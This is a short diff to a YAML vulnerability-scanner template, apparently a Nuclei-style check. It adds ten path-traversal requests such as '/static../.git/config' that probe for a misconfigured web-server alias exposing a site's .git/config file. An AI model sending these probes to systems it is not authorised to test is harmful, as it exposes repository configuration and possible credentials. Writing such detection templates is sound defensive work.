@@ -13,7 +13,16 @@ brief:
 moves:
     - verb: GET
       to:
-        - '{{BaseURL}}{{paths}}'
+        - '{{BaseURL}}/static../.git/config'
+        - '{{BaseURL}}/js../.git/config'
+        - '{{BaseURL}}/images../.git/config'
+        - '{{BaseURL}}/img../.git/config'
+        - '{{BaseURL}}/css../.git/config'
+        - '{{BaseURL}}/assets../.git/config'
+        - '{{BaseURL}}/content../.git/config'
+        - '{{BaseURL}}/events../.git/config'
+        - '{{BaseURL}}/media../.git/config'
+        - '{{BaseURL}}/lib../.git/config'
       signs:
         - "on": word
           has:
